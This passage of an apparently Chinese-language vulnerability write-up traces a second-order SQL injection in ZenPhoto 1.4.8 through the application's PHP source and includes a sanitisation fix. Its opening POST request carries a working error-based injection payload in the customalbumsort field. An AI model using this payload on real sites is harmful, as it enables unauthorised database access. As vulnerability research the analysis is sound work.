class="line">XSRFToken=3c826630e2a936b757048ca5459610812694caba&amp;savegalleryoptions=yes&amp;password_enabled=0&amp;gallery_title_en_US=%E7%9B%B8%E9%A6%86&amp;Gallery_description_en_US=You+can+insert+your+Gallery+description+on+the+Admin+Options+Gallery+tab.&amp;gallery_security=public&amp;user=&amp;pass=&amp;pass=&amp;hint_en_US=&amp;gallery-page_archive=0&amp;gallery-page_contact=0&amp;gallery-page_favorites=0&amp;gallery-page_register=0&amp;gallery-page_index=0&amp;gallery_page_unprotected_contact=1&amp;gallery_page_unprotected_register=1&amp;website_title_en_US=&amp;website_url=&amp;thumbselector=1&amp;gallery_sorttype=custom&amp;customalbumsort=id%2Cextractvalue%280x0a%2Cconcat%280x0a%2C%28select+version%28%29%29%29%29%2523&amp;album_default=1&amp;image_default=1&amp;codeblock1-0=</div></pre></td></tr></table></figure>
<p>定位到<code>/zenphoto-zenphoto-1.4.8/zp-core/admin-options.php</code>文件，找到<code>savegalleryoptions</code>相关代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/* * * Gallery options ** */</span></div><div class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'savegalleryoptions'</span>])) &#123;</div><div class="line"></div><div class="line">    $_zp_gallery-&gt;setAlbumPublish((int) <span class="keyword">isset</span>($_POST[<span class="string">'album_default'</span>]));</div><div class="line">    $_zp_gallery-&gt;setImagePublish((int) <span class="keyword">isset</span>($_POST[<span class="string">'image_default'</span>]));</div><div class="line"></div><div class="line">    setOption(<span class="string">'AlbumThumbSelect'</span>, sanitize_numeric($_POST[<span class="string">'thumbselector'</span>]));</div><div class="line">    $_zp_gallery-&gt;setThumbSelectImages((int) <span class="keyword">isset</span>($_POST[<span class="string">'thumb_select_images'</span>]));</div><div class="line">    $_zp_gallery-&gt;setSecondLevelThumbs((int) <span class="keyword">isset</span>($_POST[<span class="string">'multilevel_thumb_select_images'</span>]));</div><div class="line">    $_zp_gallery-&gt;setTitle(process_language_string_save(<span class="string">'gallery_title'</span>, <span class="number">2</span>));</div><div class="line">    $_zp_gallery-&gt;setDesc(process_language_string_save(<span class="string">'Gallery_description'</span>, EDITOR_SANITIZE_LEVEL));</div><div class="line">    $_zp_gallery-&gt;setWebsiteTitle(process_language_string_save(<span class="string">'website_title'</span>, <span class="number">2</span>));</div><div class="line">    $web = sanitize($_POST[<span class="string">'website_url'</span>], <span class="number">3</span>);</div><div class="line">    $_zp_gallery-&gt;setWebsiteURL($web);</div><div class="line">    $_zp_gallery-&gt;setAlbumUseImagedate((int) <span class="keyword">isset</span>($_POST[<span class="string">'album_use_new_image_date'</span>]));</div><div class="line">    $st = strtolower(sanitize($_POST[<span class="string">'gallery_sorttype'</span>], <span class="number">3</span>));</div><div class="line">    <span class="keyword">if</span> ($st == <span class="string">'custom'</span>)</div><div class="line">        $st = strtolower(sanitize($_POST[<span class="string">'customalbumsort'</span>], <span class="number">3</span>));</div><div class="line">    $_zp_gallery-&gt;setSortType($st);</div><div class="line">    <span class="keyword">if</span> (($st == <span class="string">'manual'</span>) || ($st == <span class="string">'random'</span>)) &#123;</div><div class="line">        $_zp_gallery-&gt;setSortDirection(<span class="keyword">false</span>);</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        $_zp_gallery-&gt;setSortDirection(<span class="keyword">isset</span>($_POST[<span class="string">'gallery_sortdirection'</span>]));</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">foreach</span> ($_POST <span class="keyword">as</span> $item =&gt; $value) &#123;</div><div class="line">        <span class="keyword">if</span> (strpos($item, <span class="string">'gallery-page_'</span>) === <span class="number">0</span>) &#123;</div><div class="line">            $item = sanitize(substr(postIndexDecode($item), <span class="number">13</span>));</div><div class="line">            $_zp_gallery-&gt;setUnprotectedPage($item, (int) <span class="keyword">isset</span>($_POST[<span class="string">'gallery_page_unprotected_'</span> . $item]));</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    $_zp_gallery-&gt;setSecurity(sanitize($_POST[<span class="string">'gallery_security'</span>], <span class="number">3</span>));</div><div class="line">    $notify = processCredentials($_zp_gallery);</div><div class="line">    <span class="keyword">if</span> (zp_loggedin(CODEBLOCK_RIGHTS)) &#123;</div><div class="line">        $_zp_gallery-&gt;setCodeblock(processCodeblockSave(<span class="number">0</span>));</div><div class="line">    &#125;</div><div class="line">    $_zp_gallery-&gt;save();</div><div class="line">    $returntab = <span class="string">"&amp;tab=gallery"</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>定位到<code>gallery_sorttype</code>参数， <code>$st = strtolower(sanitize($_POST[&#39;gallery_sorttype&#39;], 3));</code>，留意到这里对<code>$_POST</code>进来的值传到了<code>sanitize</code>函数。该函数的在文件<code>/zenphoto-zenphoto-1.4.8/zp-core/functions-common.php</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">sanitize</span><span class="params">($input_string, $sanitize_level = <span class="number">3</span>)</span> </span>&#123;</div><div class="line">    <span class="keyword">if</span> (is_array($input_string)) &#123;</div><div class="line">        $output_string = <span class="keyword">array</span>();</div><div class="line">        <span class="keyword">foreach</span> ($input_string <span class="keyword">as</span> $output_key =&gt; $output_value) &#123;</div><div class="line">            $output_string[$output_key] = sanitize($output_value, $sanitize_level);</div><div class="line">        &#125;</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        $output_string = sanitize_string($input_string, $sanitize_level);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> $output_string;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>这个函数对传入<code>$input_string</code>先判断是否是数组，如果是，就遍历数组，过滤每个值。如果不是，就直接将<code>$input_string</code>丢入<code>sanitize_string</code>函数去做过滤，最后返回过滤后的值。其实这里有点不严谨，因为如果传入是数组的话，仅仅对<code>value</code>做了过滤，而<code>key</code>是原样保留的，会有安全隐患。我简单改造了下这个函数</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">sanitize</span><span class="params">($input_string, $sanitize_level = <span class="number">3</span>)</span> </span>&#123;</div><div class="line">    <span class="keyword">if</span> (is_array($input_string)) &#123;</div><div class="line">        $output_string = <span class="keyword">array</span>();</div><div class="line">        <span class="keyword">foreach</span> ($input_string <span class="keyword">as</span> $output_key =&gt; $output_value) &#123;</div><div class="line">            $output_key = sanitize($output_key, $sanitize_level);</div><div class="line">            $output_value = sanitize($output_value, $sanitize_level);</div><div class="line">            $output_string[$output_key] = $output_value;</div><div class="line">        &#125;</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        $output_string = sanitize_string($input_string, $sanitize_level);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> $output_string;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>继续在该文件里跟踪<code>sanitize_string</code>函数</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">sanitize_string</span><span class="params">($input, $sanitize_level)</span> </span>&#123;</div><div class="line">    <span class="comment">// Strip slashes if get_magic_quotes_gpc is enabled.</span></div><div class="line">    <span class="keyword">if</span> (is_string($input)) &#123;</div><div class="line">        <span class="keyword">if</span> (get_magic_quotes_gpc()) &#123;</div><div class="line">            $input = stripslashes($input);</div><div class="line">        &#125;</div><div class="line">        $input = str_replace(chr(<span class="number">0</span>), <span class="string">" "</span>, $input);</div><div class="line">        <span class="keyword">switch</span> ($sanitize_level) &#123;</div><div class="line">            <span class="keyword">case</span> <span class="number">0</span>:</div><div class="line">                <span class="keyword">return</span> $input;</div><div class="line">            <span class="keyword">case</span> <span class="number">2</span>:</div><div class="line">                <span class="comment">// Strips non-style tags.</span></div><div class="line">                $input = sanitize_script($input);</div><div class="line">                <span class="keyword">return</span> ksesProcess($input, getAllowedTags(<span class="string">'style_tags'</span>));</div><div class="line">            <span class="keyword">case</span> <span class="number">3</span>:</div><div class="line">                <span class="comment">// Full sanitation.  Strips all code.</span></div><div class="line">                <span class="keyword">return</span> getBare($input);</div><div class="line"></div><div class="line">            <span class="keyword">case</span> <span class="number">1</span>:</div><div class="line">                <span class="comment">// Text formatting sanititation.</span></div><div class="line">                $input = sanitize_script($input);</div><div class="line">                <span class="keyword">return</span> ksesProcess($input, getAllowedTags(<span class="string">'allowed_tags'</span>));</div><div class="line">            <span class="keyword">case</span> <span class="number">4</span>:</div><div class="line">            <span class="keyword">default</span>:</div><div class="line">                <span class="comment">// for internal use to eliminate security injections</span></div><div class="line">                <span class="keyword">return</span> sanitize_script($input);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> $input;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>这个函数在服务器开启<code>gpc</code>的情况下，会先对参数<code>stripslashes</code>一下，<code>sanitize_level</code>为<code>3</code>的情况下，将<code>$input</code>传入了<code>getBare</code>函数，并返回该函数执行结果。跟进<code>getBare</code>函数</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">getBare</span><span class="params">($content)</span> </span>&#123;</div><div class="line">  $content = preg_replace(<span class="string">'~&lt;script.*?/script&gt;~is'</span>, <span class="string">''</span>, $content);</div><div class="line">  $content = preg_replace(<span class="string">'~&lt;style.*?/style&gt;~is'</span>, <span class="string">''</span>, $content);</div><div class="line">  $content = preg_replace(<span class="string">'~&lt;!--.*?--&gt;~is'</span>, <span class="string">''</span>, $content);</div><div class="line">  $content = strip_tags($content);</div><div class="line">  $content = str_replace(<span class="string">'&amp;nbsp;'</span>, <span class="string">' '</span>, $content);</div><div class="line">  $content = html_entity_decode($content, ENT_QUOTES, <span class="string">'UTF-8'</span>);</div><div class="line">  <span class="keyword">return</span> $content;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>可以看到仅仅是替换了一些html标签，并将HTML实体转换为字符，然后就返回内容了，看来做得并不多。</p>
<p>回到<code>savegalleryoptions</code>代码块</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">$st = strtolower(sanitize($_POST[<span class="string">'gallery_sorttype'</span>], <span class="number">3</span>));</div><div class="line"><span class="keyword">if</span> ($st == <span class="string">'custom'</span>)</div><div class="line">    $st = strtolower(sanitize($_POST[<span class="string">'customalbumsort'</span>], <span class="number">3</span>));</div><div class="line">$_zp_gallery-&gt;setSortType($st);</div></pre></td></tr></table></figure>
<p><code>strtolower</code>函数将输入的内容都转换为了小写，<code>$_POST[‘customalbumsort’]</code>的内容也经过了<code>sanitize</code>函数的过滤，最后就调用了<code>_zp_galleryd</code>的<code>setSortType</code>方法，继续跟进，找到<code>_zp_gallery</code>实例</p>
<p><img src="/images/zenphoto-3.png" alt="ZenPhoto-1"></p>
<p><code>$_zp_gallery</code>即为<code>Gallery</code>类的一个实例，定义了一些<code>protected</code>变量</p>
<p><img src="/images/zenphoto-4.png" alt="ZenPhoto-1"></p>
<p>可以看到<code>setSortType</code>函数直接把参数传递给了<code>set</code>函数，在文件中找到<code>set</code>函数的定义</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">set</span><span class="params">($field, $value)</span> </span>&#123;</div><div class="line">        <span class="keyword">$this</span>-&gt;data[$field] = $value;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>这里将参数值赋值给了受保护的变量<code>$data</code>，接下来继续回到<code>savegalleryoptions</code>代码块</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$_zp_gallery-&gt;save();</div><div class="line">$returntab = <span class="string">"&amp;tab=gallery"</span>;</div></pre></td></tr></table></figure>
<p>$_zp_gallery实例调用了save方法，从Gallery类中找到save方法，将$this-&gt;data值serialize序列化后传递给了setOption函数</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">save</span><span class="params">()</span> </span>&#123;</div><div class="line">    setOption(<span class="string">'gallery_data'</span>, serialize(<span class="keyword">$this</span>-&gt;data));</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>跟进setOption函数，在文件<code>/zenphoto-zenphoto-1.4.8/zp-core/functions-basic.php</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">setOption</span><span class="params">($key, $value, $persistent = true, $creator = NULL)</span> </span>&#123;</div><div class="line">    <span class="keyword">global</span> $_zp_options;</div><div class="line">    <span class="keyword">if</span> ($persistent) &#123;</div><div class="line">        $sql = <span class="string">'INSERT INTO '</span> . prefix(<span class="string">'options'</span>) . <span class="string">' (`name`,`ownerid`,`theme`,`value`,`creator`) VALUES ('</span> . db_quote($key) . <span class="string">',0,"",'</span>;</div><div class="line">        $sqlu = <span class="string">' ON DUPLICATE KEY UPDATE `value`='</span>;</div><div class="line">        <span class="keyword">if</span> (is_null($value)) &#123;</div><div class="line">            $sql .= <span class="string">'NULL'</span>;</div><div class="line">            $sqlu .= <span class="string">'NULL'</span>;</div><div class="line">        &#125; <span class="keyword">else</span> &#123;</div><div class="line">            $sql .= db_quote($value);</div><div class="line">            $sqlu .= db_quote($value);</div><div class="line">        &#125;</div><div class="line"></div><div class="line">  <span class="keyword">if</span> (is_null($creator)) &#123;</div><div class="line">            $sql .= <span class="string">',NULL'</span>;</div><div class="line">        &#125; <span class="keyword">else</span> &#123;</div><div class="line">            $sql .= <span class="string">','</span>.db_quote($creator);</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        $sql .= <span class="string">') '</span> . $sqlu;</div><div class="line">        $result = query($sql, <span class="keyword">false</span>);</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        $result = <span class="keyword">true</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span> ($result) &#123;</div><div class="line">        $_zp_options[strtolower($key)] = $value;</div><div class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>这里我们传入<code>$key</code>是<code>gallery_data</code>，<code>$value</code>是序列化后的<code>$this-&gt;data</code>，从代码中可以看到这两个在<code>INSERT INTO</code>前都要经过<code>db_quote</code>函数处理，跟进<code>db_quote</code>，我本地选择的<code>mysqli</code>扩展，所以定位到此文件<code>/zenphoto-zenphoto-1.4.8/zp-core/functions-db-MySQLi.php</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">db_quote</span><span class="params">($string)</span> </span>&#123;</div><div class="line">    <span class="keyword">global</span> $_zp_DB_connection;</div><div class="line">    <span class="keyword">return</span> <span class="string">"'"</span> . $_zp_DB_connection-&gt;real_escape_string($string) . <span class="string">"'"</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>这里的<code>$_zp_DB_connection</code>即为我<code>mysqli</code>连接串，接着<code>$_zp_DB_connection-&gt;real_escape_string($string)</code>其实是一种面向对象的写法，面向过程的写法是这样的<code>string mysqli_real_escape_string ( mysqli $link , string $escapestr )</code>，官方文档里有说明该函数过滤哪些字符。</p>
<p><img src="/images/zenphoto-5.png" alt="ZenPhoto-1"></p>
<p>看来<code>db_quote</code>还是有用的，毕竟单双引号都被干掉了，所以这个输入点的是无法构造出带单双引号的payload的，回到漏洞复现的步骤，当时填入的<code>payload</code>是<code>id,extractvalue(0x0a,concat(0x0a,(select version())))%23</code>，这个payload是不受到过滤函数影响的，从数据库也可以看到payload被完整的插入进去了</p>
<p><img src="/images/zenphoto-6.png" alt="ZenPhoto-1"></p>
<p>到这里可以看到该二阶注入的第一步已经成功了，下面继续分析</p>
<p>访问</p>
<pre><code>http://localhost:8888/zenphoto-zenphoto-1.4.8/zp-core/admin-upload.php?page=upload&amp;tab=http&amp;type=images
</code></pre><p>能触发漏洞，找到相关位置，<code>/zenphoto-zenphoto-1.4.8/zp-core/admin-upload.php</code>，66行</p>
<pre><code>genAlbumList($albumlist);
</code></pre><p>找到该函数实现的位置，文件<code>/zenphoto-zenphoto-1.4.8/zp-core/admin-functions.php</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">genAlbumList</span><span class="params">(&amp;$list, $curAlbum = NULL, $rights = UPLOAD_RIGHTS)</span> </span>&#123;</div><div class="line">    <span class="keyword">global</span> $_zp_gallery;</div><div class="line">    <span class="keyword">if</span> (is_null($curAlbum)) &#123;</div><div class="line">        $albums = <span class="keyword">array</span>();</div><div class="line">        $albumsprime = $_zp_gallery-&gt;getAlbums(<span class="number">0</span>);</div><div class="line">        <span class="keyword">foreach</span> ($albumsprime <span class="keyword">as</span> $album) &#123; <span class="comment">// check for rights</span></div><div class="line">            $albumobj = newAlbum($album);</div><div class="line">            <span class="keyword">if</span> ($albumobj-&gt;isMyItem($rights)) &#123;</div><div class="line">                $albums[] = $album;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        $albums = $curAlbum-&gt;getAlbums(<span class="number">0</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span> (is_array($albums)) &#123;</div><div class="line">        <span class="keyword">foreach</span> ($albums <span class="keyword">as</span> $folder) &#123;</div><div class="line">            $album = newAlbum($folder);</div><div class="line">            <span class="keyword">if</span> ($album-&gt;isDynamic()) &#123;</div><div class="line">                <span class="keyword">if</span> ($rights == ALL_ALBUMS_RIGHTS) &#123;</div><div class="line">                    $list[$album-&gt;getFileName()] = $album-&gt;getTitle();</div><div class="line">                &#125;</div><div class="line">            &#125; <span class="keyword">else</span> &#123;</div><div class="line">                $list[$album-&gt;getFileName()] = $album-&gt;getTitle();</div><div class="line">                genAlbumList($list, $album, $rights); <span class="comment">/* generate for subalbums */</span></div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p><code>$albumsprime = $_zp_gallery-&gt;getAlbums(0);</code>，这里有个我们熟悉的类实例<code>$_zp_gallery</code>，跟进<br><code>/zenphoto-zenphoto-1.4.8/zp-core/class-gallery.php</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">getAlbums</span><span class="params">($page = <span class="number">0</span>, $sorttype = null, $direction = null, $care = true, $mine = NULL)</span> </span>&#123;</div><div class="line"></div><div class="line"><span class="comment">// Have the albums been loaded yet?</span></div><div class="line">    <span class="keyword">if</span> ($mine || is_null(<span class="keyword">$this</span>-&gt;albums) || $care &amp;&amp; $sorttype . $direction !== <span class="keyword">$this</span>-&gt;lastalbumsort) &#123;</div><div class="line"></div><div class="line">        $albumnames = <span class="keyword">$this</span>-&gt;loadAlbumNames();</div><div class="line">        $key = <span class="keyword">$this</span>-&gt;getAlbumSortKey($sorttype);</div><div class="line">        $albums = <span class="keyword">$this</span>-&gt;sortAlbumArray(<span class="keyword">NULL</span>, $albumnames, $key, $direction, $mine);</div><div class="line"></div><div class="line"><span class="comment">// Store the values</span></div><div class="line">        <span class="keyword">$this</span>-&gt;albums = $albums;</div><div class="line">        <span class="keyword">$this</span>-&gt;lastalbumsort = $sorttype . $direction;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">if</span> ($page == <span class="number">0</span>) &#123;</div><div class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;albums;</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        <span class="keyword">return</span> array_slice(<span class="keyword">$this</span>-&gt;albums, galleryAlbumsPerPage() * ($page - <span class="number">1</span>), galleryAlbumsPerPage());</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p><code>$sorttype</code>变量值为<code>NULL</code>，注意这里的<code>$key</code>参数，这个就是被我们污染了的变量，跟进下<code>getAlbumSortKey</code>的由来，<code>/zenphoto-zenphoto-1.4.8/zp-core/class-gallery.php</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">getAlbumSortKey</span><span class="params">($sorttype = null)</span> </span>&#123;</div><div class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>($sorttype)) &#123;</div><div class="line">        $sorttype = <span class="keyword">$this</span>-&gt;getSortType();</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> lookupSortKey($sorttype, <span class="string">'sort_order'</span>, <span class="string">'albums'</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>由于传入的<code>$sorttype</code>为<code>NULL</code>，所以进入了<code>if</code>判断，调用<code>getSortType</code>函数去了，跟进<br><code>/zenphoto-zenphoto-1.4.8/zp-core/class-gallery.php</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">getSortType</span><span class="params">()</span> </span>&#123;</div><div class="line">    $type = <span class="keyword">$this</span>-&gt;get(<span class="string">'gallery_sorttype'</span>);</div><div class="line">    <span class="keyword">return</span> $type;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>这里回去调用<code>get</code>方法，并返回结果，所以找<code>get</code>方法去</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">get</span><span class="params">($field)</span> </span>&#123;</div><div class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;data[$field])) &#123;</div><div class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;data[$field];</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="keyword">NULL</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>这里传入一个<code>$field</code>，会返回<code>$this-&gt;data</code>值，而这个<code>$this-&gt;data</code>在构造函数中的实现为<br><code>/zenphoto-zenphoto-1.4.8/zp-core/class-gallery.php</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</div><div class="line"><span class="comment">// Set our album directory</span></div><div class="line">    <span class="keyword">$this</span>-&gt;albumdir = ALBUM_FOLDER_SERVERPATH;</div><div class="line">    $data = getOption(<span class="string">'gallery_data'</span>);</div><div class="line">    <span class="keyword">if</span> ($data) &#123;</div><div class="line">        <span class="keyword">$this</span>-&gt;data = getSerializedArray($data);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;data[<span class="string">'unprotected_pages'</span>])) &#123;</div><div class="line">        $pages = getSerializedArray(<span class="keyword">$this</span>-&gt;data[<span class="string">'unprotected_pages'</span>]);</div><div class="line">        <span class="keyword">if</span> (is_array($pages))</div><div class="line">            <span class="keyword">$this</span>-&gt;unprotected_pages = $pages; <span class="comment">//    protect against a failure</span></div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>跟进<code>getOption</code>函数<br><code>/zenphoto-zenphoto-1.4.8/zp-core/functions-basic.php</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">getOption</span><span class="params">($key)</span> </span>&#123;</div><div class="line">    <span class="keyword">global</span> $_zp_conf_vars, $_zp_options;</div><div class="line">    $key = strtolower($key);</div><div class="line">    <span class="keyword">if</span> (is_null($_zp_options) &amp;&amp; function_exists(<span class="string">'query_full_array'</span>)) &#123; <span class="comment">// may be too early to use database!</span></div><div class="line">        <span class="comment">// option table not yet loaded, load it (but not the theme options!)</span></div><div class="line">        $sql = <span class="string">"SELECT `name`, `value` FROM "</span> . prefix(<span class="string">'options'</span>) . <span class="string">' WHERE (`theme`="" OR `theme` IS NULL) AND `ownerid`=0'</span>;</div><div class="line">        $optionlist = query_full_array($sql, <span class="keyword">false</span>);</div><div class="line">        <span class="keyword">if</span> ($optionlist !== <span class="keyword">false</span>) &#123;</div><div class="line">            $_zp_options = <span class="keyword">array</span>();</div><div class="line">            <span class="keyword">foreach</span> ($optionlist <span class="keyword">as</span> $option) &#123;</div><div class="line">                $_zp_options[strtolower($option[<span class="string">'name'</span>])] = $option[<span class="string">'value'</span>];</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_zp_options[$key])) &#123;</div><div class="line">        <span class="keyword">return</span> $_zp_options[$key];</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        <span 